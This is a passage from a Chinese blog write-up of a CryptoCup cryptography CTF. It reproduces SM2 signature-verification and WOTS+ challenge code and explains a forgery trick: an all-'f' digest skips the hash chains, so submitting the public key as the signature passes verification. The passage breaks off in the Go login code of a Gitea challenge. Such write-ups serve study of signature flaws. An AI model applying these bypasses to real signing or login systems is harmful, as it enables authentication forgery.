验证中间证书有效期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_certificate_expiration_date(self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书已过期或尚未生效&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 验证中间证书签名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_signature(self.signature_bytes, self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书验证未通过&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Config</span>:</span><br><span class="line">    <span class="comment"># sm2参数初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, asn1_str</span>):</span><br><span class="line">        self.sm2_signed_data,asn1_acess = self.hex_to_asn1(asn1_str, SM2SignedData())</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(asn1_acess) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;asn1长度有问题&quot;</span>)</span><br><span class="line">        cert_hex = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;certificate&#x27;</span>])</span><br><span class="line">        sm2_cert_verifier = Sm2CertVerifier(cert_hex)</span><br><span class="line">        valid = sm2_cert_verifier.verify()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;证书验证不通过&quot;</span>)</span><br><span class="line">        g = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;basePoint&#x27;</span>])</span><br><span class="line">        g = g[<span class="number">2</span>:] <span class="keyword">if</span> g.startswith(<span class="string">&quot;04&quot;</span>) <span class="keyword">else</span> g</span><br><span class="line">        self.ecc_table = &#123;</span><br><span class="line">            <span class="string">&#x27;n&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;p&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;fieldParameters&#x27;</span>][<span class="string">&#x27;prime&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;g&#x27;</span>: g,</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientA&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientB&#x27;</span>]),</span><br><span class="line">        &#125;</span><br><span class="line">        public_key = self.extract_public_key(sm2_cert_verifier.cert_tbs)</span><br><span class="line">        self.sm2_crypt = CryptSM2(</span><br><span class="line">            private_key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            public_key=public_key,</span><br><span class="line">            ecc_table=self.ecc_table</span><br><span class="line">        )</span><br><span class="line">        self.sign = (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;r&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper() +</span><br><span class="line">                     <span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;s&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hex_to_asn1</span>(<span class="params">hex_str, asn1_spec</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将16进制字符串转换回ASN.1对象</span></span><br><span class="line"><span class="string">        :param hex_str: 16进制字符串</span></span><br><span class="line"><span class="string">        :param asn1_spec: ASN.1结构定义</span></span><br><span class="line"><span class="string">        :return: ASN.1对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">        der_bytes = binascii.unhexlify(hex_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">        asn1_object, excess = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> asn1_object,excess</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_hex_value</span>(<span class="params">value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;通用转换函数：将 ASN.1 值转换为 16 进制字符串（大写，无前缀）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, univ.Integer):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">format</span>(<span class="built_in">int</span>(value), <span class="string">&#x27;X&#x27;</span>)  <span class="comment"># Integer -&gt; 直接转十六进制</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, univ.OctetString):</span><br><span class="line">            <span class="keyword">return</span> value.asOctets().<span class="built_in">hex</span>().upper()  <span class="comment"># OctetString -&gt; 字节转十六进制</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unsupported type: <span class="subst">&#123;<span class="built_in">type</span>(value)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_public_key</span>(<span class="params">tbs</span>):</span><br><span class="line">        spki = tbs.getComponentByName(<span class="string">&#x27;subjectPublicKeyInfo&#x27;</span>)</span><br><span class="line">        public_key_bitstring = spki.getComponentByName(<span class="string">&#x27;subjectPublicKey&#x27;</span>)</span><br><span class="line">        <span class="comment"># 提取位串内容（包含开头的 0x04）</span></span><br><span class="line">        pubkey_bytes = <span class="built_in">bytearray</span>(public_key_bitstring.asOctets())</span><br><span class="line">        <span class="comment"># 转成十六进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> pubkey_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_misc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;version&#x27;</span>]) != <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>]) != <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;timestamp&#x27;</span>]) != <span class="string">&quot;20250520101000Z&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2验签</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, data</span>):</span><br><span class="line">        valid = self.verify_misc()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line">        valid = self.sm2_crypt.verify_with_sm3(self.sign, data)</span><br><span class="line">        <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过该函数可以产生一个合法的SM2SignedData</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSM2SignedDataExample</span>():</span><br><span class="line">    <span class="comment"># 版本</span></span><br><span class="line">    version = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 哈希算法oid</span></span><br><span class="line">    oid = <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span></span><br><span class="line">    <span class="comment"># 签名值r, s</span></span><br><span class="line">    signature = <span class="string">&#x27;6f8eaff551d0f3fa6de74b75b33e1e58f9fdb4dc58e61c82e11e717ffcf168c4db3d5a90ff3625d12b8b658f8dbab34340c278b412b3aff25489e7feb1c75598&#x27;</span></span><br><span class="line">    r = signature[:<span class="number">64</span>]</span><br><span class="line">    s = signature[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    curve_params = &#123;</span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    cert_hex = <span class="string">&#x27;3082017C30820122A003020102020D00947C8427D3E849B48A7E5136300A06082A811CCF550183753036310B300906035504061302434E31133011060355040A130A5368616E674D6942656931123010060355040313095368616E674D694341301E170D3235303532303035353330365A170D3330303531393035353330365A304D310B300906035504061302434E3110300E060355040A1307496E746572434131173015060355040B130E5368616E674D6942656932303235311330110603550403130A7368616E676D696265693059301306072A8648CE3D020106082A811CCF5501822D03420004CECC0005AED684A1E7E39C316E7F3F39BDD0490936BC0E1AFDDC1B9627A05B4418809E5327746EE1977913F036EF0A9A255C27D73C00E45D0BB205B34D2C80D4300A06082A811CCF5501837503480030450220360779CBF5AA6E5E9CC073D95E22C52C09E81CFC06A3916559063A3C8C1DFDE6022100ED0E5E5E51F3894A3EAC11F247739D9F6A88C961D89F68337972BC3CC6BB6706&#x27;</span>  <span class="comment"># 证书16进制格式</span></span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    time_stamp = <span class="string">&#x27;2025-05-20 10:10:00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># asn1封装</span></span><br><span class="line">    asn1_package_hex = asn1_package(version, oid, signature, curve_params, cert_hex, time_stamp)</span><br><span class="line">    <span class="keyword">return</span>(asn1_package_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 验签</span></span><br><span class="line">    data = <span class="string">b&quot;Hello, CryptoCup!&quot;</span></span><br><span class="line">    asn1_package_hex = generateSM2SignedDataExample()</span><br><span class="line">    sm2_config = SM2Config(asn1_package_hex)</span><br><span class="line">    result = sm2_config.verify(data)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">308202CD02010106092A811CCF5501831101304502206F8EAFF551D0F3FA6DE74B75B33E1E58F9FDB4DC58E61C82E11E717FFCF168C4022100DB3D5A90FF3625D12B8B658F8DBAB34340C278B412B3AFF25489E7FEB1C755983081E0020101302C06072A8648CE3D0101022100FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF30440420FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC042028E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E9304410432C4AE2C1F1981195F9904466A39C9948FE30BBFF2660BE1715A4589334C74C7BC3736A2F4F6779C59BDCEE36B692153D0A9877CC62A474002DF32E52139F0A0022100FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123020101048201803082017C30820122A003020102020D00947C8427D3E849B48A7E5136300A06082A811CCF550183753036310B300906035504061302434E31133011060355040A130A5368616E674D6942656931123010060355040313095368616E674D694341301E170D3235303532303035353330365A170D3330303531393035353330365A304D310B300906035504061302434E3110300E060355040A1307496E746572434131173015060355040B130E5368616E674D6942656932303235311330110603550403130A7368616E676D696265693059301306072A8648CE3D020106082A811CCF5501822D03420004CECC0005AED684A1E7E39C316E7F3F39BDD0490936BC0E1AFDDC1B9627A05B4418809E5327746EE1977913F036EF0A9A255C27D73C00E45D0BB205B34D2C80D4300A06082A811CCF5501837503480030450220360779CBF5AA6E5E9CC073D95E22C52C09E81CFC06A3916559063A3C8C1DFDE6022100ED0E5E5E51F3894A3EAC11F247739D9F6A88C961D89F68337972BC3CC6BB6706180F32303235303532303130313030305A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">待签名消息(字符串):</span></span><br><span class="line"><span class="string">TYTNGLNVKYDLVCGTUYUARFLEFKLAKAZO</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="初始谜题3"><a href="#初始谜题3" class="headerlink" title="初始谜题3"></a>初始谜题3</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_32byte_chunks</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 确保十六进制字符串长度是64的倍数（因为32字节 = 64个十六进制字符）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;十六进制字符串长度必须是64的倍数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每64个字符分割一次，并转换为字节</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">bytes</span>.fromhex(hex_str[i:i + <span class="number">64</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openssl_sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOTSPLUS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        w: <span class="built_in">int</span> = <span class="number">16</span>,  <span class="comment"># Winternitz 参数，控制空间与时间的复杂度</span></span></span><br><span class="line"><span class="params">        hashfunction: <span class="type">Callable</span> = openssl_sha256,  <span class="comment"># 哈希函数</span></span></span><br><span class="line"><span class="params">        digestsize: <span class="built_in">int</span> = <span class="number">256</span>,  <span class="comment"># 摘要大小，单位为比特</span></span></span><br><span class="line"><span class="params">        pubkey: <span class="type">List</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.w = w</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">2</span> &lt;= w &lt;= (<span class="number">1</span> &lt;&lt; digestsize)):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;规则错误:2 &lt;= w &lt;= 2^digestsize&quot;</span>)</span><br><span class="line">        <span class="comment"># 消息摘要所需的密钥数量（默认8个）</span></span><br><span class="line">        self.msg_key_count = <span class="number">8</span></span><br><span class="line">        <span class="comment"># 校验和密钥数量</span></span><br><span class="line">        self.cs_key_count = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 总密钥数量 = 消息密钥 + 校验和密钥</span></span><br><span class="line">        self.key_count = self.msg_key_count + self.cs_key_count</span><br><span class="line">        self.hashfunction = hashfunction</span><br><span class="line">        self.digestsize = digestsize</span><br><span class="line">        self.pubkey = pubkey</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">number_to_base</span>(<span class="params">num: <span class="built_in">int</span>, base: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>]  <span class="comment"># 如果数字是 0，直接返回 0</span></span><br><span class="line"></span><br><span class="line">        digits = []  <span class="comment"># 存储转换后的数字位</span></span><br><span class="line">        <span class="keyword">while</span> num:</span><br><span class="line">            digits.append(<span class="built_in">int</span>(num % base))  <span class="comment"># 获取当前数字在目标进制下的个位，并添加到结果列表</span></span><br><span class="line">            num //= base  <span class="comment"># 对数字进行整除，处理下一位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> digits[::-<span class="number">1</span>]  <span class="comment"># 返回按顺序排列的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_chain</span>(<span class="params">self, value: <span class="built_in">bytes</span>, startidx: <span class="built_in">int</span>, endidx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startidx, endidx):</span><br><span class="line">            value = self.hashfunction(value)  <span class="comment"># 每次迭代对当前哈希值进行哈希操作</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_signature_base_message</span>(<span class="params">self, msghash: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 将消息哈希从字节转换为整数</span></span><br><span class="line">        msgnum = <span class="built_in">int</span>.from_bytes(msghash, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将消息的数字表示转换为特定进制下的比特组表示</span></span><br><span class="line">        msg_to_sign = self.number_to_base(msgnum, self.w)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 校验消息比特组的数量是否符合预期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg_to_sign) &gt; self.msg_key_count:</span><br><span class="line">            err = (</span><br><span class="line">                <span class="string">&quot;The fingerprint of the message could not be split into the&quot;</span></span><br><span class="line">                + <span class="string">&quot; expected amount of bitgroups. This is most likely &quot;</span></span><br><span class="line">                + <span class="string">&quot;because the digestsize specified does not match to the &quot;</span></span><br><span class="line">                + <span class="string">&quot; real digestsize of the specified hashfunction Excepted:&quot;</span></span><br><span class="line">                + <span class="string">&quot; &#123;&#125; bitgroups\nGot: &#123;&#125; bitgroups&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> IndexError(err.<span class="built_in">format</span>(self.msg_key_count, <span class="built_in">len</span>(msg_to_sign)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg_to_sign</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pubkey_from_signature</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="type">List</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">        msg_to_verify = self.get_signature_base_message(digest)</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg_to_verify):</span><br><span class="line">            sig_part = signature[idx]</span><br><span class="line">            chained_val = self._chain(sig_part, val, self.w - <span class="number">1</span>)</span><br><span class="line">            result.append(chained_val)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        pubkey = self.get_pubkey_from_signature(digest, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pubkey == self.pubkey <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pubkey_hex = <span class="string">&quot;5057432973dc856a7a00272d83ea1c14de52b5eb3ba8b70b373db8204eb2f902450e38dbade5e9b8c2c3f8258edc4b7e8101e94ac86e4b3cba92ddf3d5de2a2b454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114af4f0cf8f80e22c3975ba477dc4769c3ef67ffdf2090735d81d07bc2e6235af1ee41ef332215422d31208c2bc2163d6690bd32f4926b2858ca41c12eec88c0a300571901a3f674288e4a623220fb6b70e558d9819d2f23da6d897278f4056c346d7f729f5f70805ad4e5bd25cfa502c0625ac02185e014cf36db4ebcdb3ed1a38&quot;</span></span><br><span class="line">    pubkey_list_bytes = hex_to_32byte_chunks(pubkey_hex)</span><br><span class="line">    wots = WOTSPLUS(pubkey=pubkey_list_bytes)</span><br><span class="line">    digest_hex = <span class="string">&quot;84ffb82e&quot;</span></span><br><span class="line">    signature_hex = <span class="string">&quot;25d5a0e650d683506bfe9d2eca6a3a99b547a4b99398622f6666ce10131e971b6bd36841c9074fe9b4de2900ebe3fadb3202a173be486da6cf8f3d8c699c95c3454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114a4966398a789b56bdb09ea195925e7e8cde372305d244604c48db08f08a6e8a38951030deb25a7aaf1c07152a302ebc07d5d0893b5e9a5953f3b8500179d138b9aa90c0aaacea0c23d22a25a86c0b747c561b480175b548fcb1f4ad1153413bc74d9c049d43ffe18ceee31e5be8bdb9968103ef32fb4054a4a23c400bbfe0d89f&quot;</span></span><br><span class="line">    digest_bytes = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    signature = hex_to_32byte_chunks(signature_hex)</span><br><span class="line">    valid = wots.verify(digest_bytes, signature)</span><br><span class="line">    <span class="built_in">print</span>(valid)</span><br></pre></td></tr></table></figure><p>十六进制的签名<code>signature_hex</code>经过<code>hex_to_32byte_chunks</code>被分成了八组<br><strong>消息摘要</strong>的主要用途是计算这八组数据的<strong>sha256迭代次数</strong>，如果消息摘要是<code>8xxxx</code>，那么第一次迭代次数就是7次，因为<code>w-1=15</code> <code>[8:15)</code>步长为7<br>最后会将哈希迭代之后的八组数据进行拼接，从而生成<code>pubkey</code><br>通过<code>verify认证函数</code>判断提交的摘要和签名所生成的<code>pubkey</code>是否和环境生成的<code>pubkey</code>一样</p><p>所以，思路很明确，既然哈希反向解密很难，因为这里必须得经过迭代，那么如果我迭代次数为零呢？这样我的签名通过<code>get_pubkey_from_signature</code>就会得到环境的公钥，我们直接让摘要为<code>ffffffff</code>，签名为环境提供的公钥，就可以通过验证了</p><p><img src="https://pica.zhimg.com/80/v2-a41a5389e5d7b44b7ffd5fb5f733c5b8_1440w.png" alt=""><br>还得是中科大，<strong>7分51秒</strong>拿下了一血，算上下载附件的时间，他们就做了5分钟<br>不过，这题确实不难，但他们代码审的好快啊O^O，我在那磨磨蹭蹭做了一个小时这样</p><h2 id="夺旗闯关"><a href="#夺旗闯关" class="headerlink" title="夺旗闯关*"></a>夺旗闯关*</h2><h3 id="gitea服务器"><a href="#gitea服务器" class="headerlink" title="gitea服务器*"></a>gitea服务器*</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># login.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/asn1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/tjfoc/gmsm/sm2&quot;</span></span><br><span class="line"><span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *LoginService)</span></span> Login(username, authInfo, certStr <span class="type">string</span>) (token <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// 读取用户证书</span></span><br><span class="line">cert, err := s.CertService.LoadCertificate(certStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.CertService.ValidateCertificate(cert, RootCert); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验用户名</span></span><br><span class="line"><span class="keyword">if</span> cert.Subject.CommonName != username &#123;</span><br><span class="line">err = errors.New(<span class="string">&quot;username is not valid&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否挑战成功（随机字符串的签名能否用证书中的公钥验签过）</span></span><br><span class="line">ecdsaPubKey, ok := cert.PublicKey.(*ecdsa.PublicKey)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;public key in cert is not sm2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">sm2PubKey := sm2.PublicKey&#123;</span><br><span class="line">Curve: ecdsaPubKey.Curve,</span><br><span class="line">X:     ecdsaPubKey.X,</span><br><span class="line">Y:     ecdsaPubKey.Y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 authInfo 中提取 randomStr 和 signature</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authInfo) != <span class="number">256</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;鉴别信息格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">randomStr := authInfo[<span class="number">0</span>:<span class="number">128</span>]</span><br><span class="line">signature := authInfo[<span class="number">128</span>:]</span><br><span class="line"></span><br><span class="line">_, err = ValidateSignature(randomStr, signature, &amp;sm2PubKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s.generateToken(username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidateSignature</span><span class="params">(messageHex, signatureHex <span class="type">string</span>, publicKey *sm2.PublicKey)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">msg, err := hex.DecodeString(messageHex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;挑战值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(signatureHex) != <span class="number">128</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span 